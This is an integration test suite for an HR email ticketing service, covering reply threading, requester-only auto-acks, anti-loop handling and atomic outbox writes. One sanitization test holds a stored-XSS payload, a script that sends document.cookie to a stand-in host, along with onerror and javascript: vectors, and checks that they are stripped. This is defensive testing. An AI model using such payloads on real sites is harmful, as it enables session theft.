import { and, desc, eq } from 'drizzle-orm';
import type { ItHarness } from './setup.it';
import { startHarness } from './setup.it';
import {
  startGreenMail,
  injectMail,
  resetMail,
  fetchMailbox,
  useGreenMailForHris,
  useGreenMailSmtpForHris,
  type GreenMail,
} from './helpers/greenmail';
import { PollerService } from '../src/modules/email-engine/poller.service';
import { IntakeService } from '../src/modules/intake/intake.service';
import { OutboxSender } from '../src/modules/email-engine/outbox-sender.service';
import { ReplyService } from '../src/modules/tickets/reply.service';
import { sendOutboundMail } from '../src/modules/tickets/send-mail.usecase';
import { Mailer } from '../src/infra/mail/mailer';
import { withActor, systemActor } from '../src/infra/db/with-actor';
import { tickets, ticketMessages, participants, inboxMessages, imapCursor, outbox } from '../src/infra/db/schema';
import type { SessionUser } from '../src/modules/auth/session.service';
import { makeUser } from './factories/user.factory';

/**
 * IT-REPLY-001..002 + IT-ACK-001..003 — Stories 3.2/3.3. The F2 backbone: an
 * employee reply leaves as one Gmail thread, the requester's reply threads back,
 * and a new ticket auto-acks the requester only. Needs Docker; self-skips.
 */
describe('IT-REPLY/ACK: reply threading + auto-ack', () => {
  let harness: ItHarness | undefined;
  let gm: GreenMail | undefined;
  let ready = false;
  let agent: SessionUser; // a processing user (member) — the one who actually replies
  const HRIS = { id: 1, key: 'hris' as const };
  const HRIS_BOX = 'hris@test.local';
  const poller = new PollerService();
  const intake = new IntakeService();
  const sender = () => new OutboxSender(new Mailer());
  const reply = new ReplyService();

  beforeAll(async () => {
    try {
      harness = await startHarness({ seed: true });
      gm = await startGreenMail();
      useGreenMailForHris(gm, HRIS_BOX);
      useGreenMailSmtpForHris(gm, HRIS_BOX);
      // A real processing user. Admin/SSA can't reply (administrative); the replies
      // below run as a Member who owns the ticket (assignee path), which is the real
      // F2 backbone actor. We assign the ingested ticket to this agent before replying.
      const u = (await makeUser(harness.db, { projectId: 1, email: 'agent-reply@x.com' }))!;
      agent = {
        id: u.id,
        email: u.email,
        name: u.name,
        role: 'member',
        projectId: 1,
        disabled: false,
        mustChangePassword: false,
      };
      ready = true;
    } catch (e) {
      console.warn('[IT-REPLY] Docker unavailable, skipping:', (e as Error)?.message);
    }
  }, 180000);

  afterAll(async () => {
    if (gm) await gm.stop();
    if (harness) await harness.stop();
  });

  beforeEach(async () => {
    if (!ready) return;
    // Children before parents (FK): inbox_messages/outbox/messages → tickets.
    await harness!.db.delete(ticketMessages);
    await harness!.db.delete(participants);
    await harness!.db.delete(outbox);
    await harness!.db.delete(inboxMessages);
    await harness!.db.delete(tickets);
    await harness!.db.delete(imapCursor);
    await resetMail(gm!);
    useGreenMailSmtpForHris(gm!, HRIS_BOX);
  });

  /** Inject a mail, poll it, run intake → return the resulting ticket row. */
  async function ingest(mail: Parameters<typeof injectMail>[1]) {
    await injectMail(gm!, mail);
    await poller.pollMailbox(HRIS);
    await intake.processReceived();
    const [t] = await harness!.db
      .select()
      .from(tickets)
      .orderBy(desc(tickets.createdAt))
      .limit(1);
    return t!;
  }

  it('IT-ACK-001: new ticket → auto-ack to requester ONLY (not CC)', async () => {
    if (!ready) return;
    const t = await ingest({
      from: 'ann@x.com',
      to: HRIS_BOX,
      cc: 'bob@x.com',
      subject: 'Leave request',
      text: 'Please approve',
      messageId: '<ack-1@x.com>',
    });
    await sender().runOnce();

    const toAnn = await fetchMailbox(gm!, 'ann@x.com');
    const ack = toAnn.find((m) => m.from?.address === HRIS_BOX);
    expect(ack).toBeDefined();
    // Gmail-threadable subject: `Re: <original>`, code in the BODY only — a changed
    // subject (the old `[#code]` marker) split the requester's Gmail conversation.
    expect(ack!.subject).toMatch(/^Re: Leave request/);
    expect(ack!.subject).not.toContain('[#');
    expect(ack!.bodyText).toContain(t.ticketCode);

    // CC (bob) must NOT receive the auto-ack.
    const toBob = await fetchMailbox(gm!, 'bob@x.com');
    expect(toBob.some((m) => m.from?.address === HRIS_BOX)).toBe(false);
  });

  it('IT-ACK-004 (đơn 15): our mailbox only in CC → ticket still created, NO auto-ack', async () => {
    if (!ready) return;
    // The requester addressed someone ELSE and merely copied HR — we track it
    // silently; acking would answer on the To'd party's behalf.
    const t = await ingest({
      from: 'dave@x.com',
      to: 'boss@x.com',
      cc: HRIS_BOX,
      subject: 'FYI leave dispute',
      text: 'copying HR for visibility',
      messageId: '<ack-cc-1@x.com>',
    });
    expect(t).toBeDefined();
    expect(t.subject).toBe('FYI leave dispute'); // the ticket EXISTS…
    await sender().runOnce();
    const toDave = await fetchMailbox(gm!, 'dave@x.com');
    expect(toDave.some((m) => m.from?.address === HRIS_BOX)).toBe(false); // …but stays silent
    // Nothing was even enqueued (gate is before the outbox, not a failed send).
    expect(await harness!.db.select().from(outbox)).toHaveLength(0);
  });

  it('IT-ACK-002: append does not ack; auto-submitted mail neither acks nor starts a thread', async () => {
    if (!ready) return;
    await ingest({
      from: 'cara@x.com',
      to: HRIS_BOX,
      subject: 'Payroll question',
      text: 'hi',
      messageId: '<ack-2-orig@x.com>',
    });
    const afterCreate = (await harness!.db.select().from(outbox)).length;
    expect(afterCreate).toBe(1); // exactly the auto-ack

    // A reply into the same thread → append, NO new ack.
    await injectMail(gm!, {
      from: 'cara@x.com',
      to: HRIS_BOX,
      subject: 'Re: Payroll question',
      text: 'more info',
      messageId: '<ack-2-reply@x.com>',
      inReplyTo: '<ack-2-orig@x.com>',
      references: '<ack-2-orig@x.com>',
    });
    await poller.pollMailbox(HRIS);
    await intake.processReceived();
    expect((await harness!.db.select().from(outbox)).length).toBe(afterCreate); // no new ack

    // Auto-submitted NEW mail → dropped (no ticket, no ack) — anti-loop layer 2.
    await injectMail(gm!, {
      from: 'mailer-daemon@x.com',
      to: HRIS_BOX,
      subject: 'Out of office',
      text: 'auto',
      messageId: '<ack-3-auto@x.com>',
      headers: { 'Auto-Submitted': 'auto-replied' },
    });
    await poller.pollMailbox(HRIS);
    await intake.processReceived();
    expect((await harness!.db.select().from(outbox)).length).toBe(afterCreate); // still no new ack
  });

  it('IT-ACK-003: a reply to the auto-ack email threads back to the same ticket (AC4)', async () => {
    if (!ready) return;
    const t = await ingest({
      from: 'jay@x.com',
      to: HRIS_BOX,
      subject: 'Bonus query',
      text: 'q',
      messageId: '<ack-4-orig@x.com>',
    });
    // Deliver the auto-ack and capture ITS generated Message-ID.
    await sender().runOnce();
    const [ack] = await harness!.db
      .select({ messageId: ticketMessages.messageId })
      .from(ticketMessages)
      .where(
        and(
          eq(ticketMessages.ticketId, t.id),
          eq(ticketMessages.direction, 'outbound'),
          eq(ticketMessages.isAutoReply, true),
        ),
      );
    expect(ack!.messageId).toBeTruthy();

    // Requester replies to the AUTO-ACK → must append to the same ticket (FR7).
    await injectMail(gm!, {
      from: 'jay@x.com',
      to: HRIS_BOX,
      subject: `Re: [${t.ticketCode}] Bonus query`,
      text: 'thanks for the code',
      messageId: '<ack-4-back@x.com>',
      inReplyTo: ack!.messageId!,
      references: ack!.messageId!,
    });
    await poller.pollMailbox(HRIS);
    await intake.processReceived();

    expect(await harness!.db.select().from(tickets)).toHaveLength(1); // no new ticket
    const back = await harness!.db
      .select()
      .from(ticketMessages)
      .where(and(eq(ticketMessages.ticketId, t.id), eq(ticketMessages.messageId, '<ack-4-back@x.com>')));
    expect(back).toHaveLength(1);
  });

  it('IT-REPLY-001: reply leaves as one thread; requester reply threads back (closed loop)', async () => {
    if (!ready) return;
    const t = await ingest({
      from: 'dan@x.com',
      to: HRIS_BOX,
      cc: 'eve@x.com',
      subject: 'Insurance',
      text: 'question',
      messageId: '<rep-1-orig@x.com>',
    });
    // The agent owns the ticket (assignee) → may reply (admin/ssa can't process).
    await harness!.db.update(tickets).set({ assigneeId: agent.id }).where(eq(tickets.id, t.id));

    const sent = await reply.reply(agent, t.id, {
      to: ['dan@x.com'],
      cc: ['eve@x.com'],
      body: 'Here is our answer.',
    });
    expect('messageId' in sent).toBe(true);
    const outMsgId = (sent as { messageId: string }).messageId;

    await sender().runOnce();

    const toDan = await fetchMailbox(gm!, 'dan@x.com');
    // Match by our outbound Message-ID (the auto-ack shares the mailbox From).
    const replyMail = toDan.find((m) => m.messageId === outMsgId);
    expect(replyMail).toBeDefined();
    // `Re: <subject>` keeps the whole exchange ONE Gmail conversation; the ticket
    // code rides in the body footer instead of the subject.
    expect(replyMail!.subject).toMatch(/^Re: /);
    expect(replyMail!.subject).not.toContain('[#');
    expect(replyMail!.bodyText).toContain(t.ticketCode);
    expect(replyMail!.from?.address).toBe(HRIS_BOX);
    expect(replyMail!.to.map((a) => a.address)).toContain('dan@x.com');
    expect(replyMail!.cc.map((a) => a.address)).toContain('eve@x.com');
    expect(replyMail!.inReplyTo).toBe('<rep-1-orig@x.com>');

    // Closed loop: requester replies to OUR outbound Message-ID → must append to same ticket.
    await injectMail(gm!, {
      from: 'dan@x.com',
      to: HRIS_BOX,
      subject: `Re: [${t.ticketCode}] Insurance`,
      text: 'thanks!',
      messageId: '<rep-1-back@x.com>',
      inReplyTo: outMsgId,
      references: outMsgId,
    });
    await poller.pollMailbox(HRIS);
    await intake.processReceived();

    const allTickets = await harness!.db.select().from(tickets);
    expect(allTickets).toHaveLength(1); // no new ticket — threaded back (FR7)
    const back = await harness!.db
      .select()
      .from(ticketMessages)
      .where(and(eq(ticketMessages.ticketId, t.id), eq(ticketMessages.messageId, '<rep-1-back@x.com>')));
    expect(back).toHaveLength(1);
  });

  it('IT-REPLY-002: a new recipient needs confirmation, then is admitted as participant', async () => {
    if (!ready) return;
    const t = await ingest({
      from: 'fay@x.com',
      to: HRIS_BOX,
      subject: 'Overtime',
      text: 'q',
      messageId: '<rep-2-orig@x.com>',
    });
    await harness!.db.update(tickets).set({ assigneeId: agent.id }).where(eq(tickets.id, t.id));

    // Adding stranger gun@z.com without confirmation → blocked with the list.
    const blocked = await reply.reply(agent, t.id, {
      to: ['fay@x.com'],
      cc: ['gun@z.com'],
      body: 'looping in a colleague',
    });
    expect(blocked).toEqual({ needsConfirm: true, newRecipients: ['gun@z.com'] });

    // Confirmed → sends and admits gun@z.com as an active participant + audit.
    const ok = await reply.reply(agent, t.id, {
      to: ['fay@x.com'],
      cc: ['gun@z.com'],
      body: 'looping in a colleague',
      confirmNewRecipients: true,
    });
    expect('messageId' in ok).toBe(true);

    const ppl = await withActor(systemActor, (tx) =>
      tx.select().from(participants).where(eq(participants.ticketId, t.id)),
    );
    const gun = ppl.find((p) => p.email === 'gun@z.com');
    expect(gun?.status).toBe('active');
  });

  it('IT-REPLY-004: client-supplied bodyHtml is sanitized before it reaches body_html_safe (stored XSS)', async () => {
    if (!ready) return;
    const t = await ingest({
      from: 'xss@x.com',
      to: HRIS_BOX,
      subject: 'Payslip',
      text: 'question',
      messageId: '<rep-4-orig@x.com>',
    });
    await harness!.db.update(tickets).set({ assigneeId: agent.id }).where(eq(tickets.id, t.id));

    // bodyHtml comes straight off the wire (compose.controller replySchema). It is
    // stored into body_html_safe, which the FE renders with dangerouslySetInnerHTML —
    // so the reply path must sanitize it, exactly as intake does for inbound mail.
    const sent = await reply.reply(agent, t.id, {
      to: ['xss@x.com'],
      body: 'answer',
      bodyHtml:
        '<p>answer</p><script>fetch("//evil.invalid?c="+document.cookie)</script>' +
        '<img src=x onerror="alert(1)"><a href="javascript:alert(2)">click</a>',
    });
    expect('messageId' in sent).toBe(true);

    // Pin to OUR reply by Message-ID — the auto-ack is outbound on this ticket too.
    const [msg] = await withActor(systemActor, (tx) =>
      tx
        .select({ safe: ticketMessages.bodyHtmlSafe })
        .from(ticketMessages)
        .where(eq(ticketMessages.messageId, (sent as { messageId: string }).messageId)),
    );
    const safe = msg!.safe ?? '';
    expect(safe).not.toContain('<script');
    expect(safe).not.toContain('onerror');
    expect(safe).not.toContain('javascript:');
    // ...while the legitimate content survives — sanitizing must not eat the reply.
    expect(safe).toContain('answer');
    // Our own footer is still intact (it is appended AFTER the sanitized user HTML,
    // so its margin-top/border-left styling is never passed through allowedStyles).
    expect(safe).toContain('Ticket:');
  });

  it('IT-REPLY-003: outbound message + outbox row are atomic — fail mid-tx rolls back both', async () => {
    if (!ready) return;
    const t = await ingest({
      from: 'iris@x.com',
      to: HRIS_BOX,
      subject: 'Atomicity',
      text: 'q',
      messageId: '<rep-3-orig@x.com>',
    });
    const countOutbound = async () =>
      (
        await harness!.db
          .select()
          .from(ticketMessages)
          .where(and(eq(ticketMessages.ticketId, t.id), eq(ticketMessages.direction, 'outbound')))
      ).length;
    const msgBefore = await countOutbound();
    const outboxBefore = (await harness!.db.select().from(outbox)).length;

    // Same tx writes the message + enqueues, THEN throws → all-or-nothing (AC4).
    await expect(
      withActor(systemActor, async (tx) => {
        await sendOutboundMail(tx, {
          projectId: 1,
          ticketId: t.id,
          fromAddr: HRIS_BOX,
          to: ['iris@x.com'],
          subject: `[${t.ticketCode}] Atomicity`,
          bodyText: 'partial',
          bodyHtml: '<p>partial</p>',
        });
        throw new Error('boom-mid-tx');
      }),
    ).rejects.toThrow('boom-mid-tx');

    // Neither the outbound message nor the outbox row survived the rollback.
    expect(await countOutbound()).toBe(msgBefore);
    expect((await harness!.db.select().from(outbox)).length).toBe(outboxBefore);
  });
});
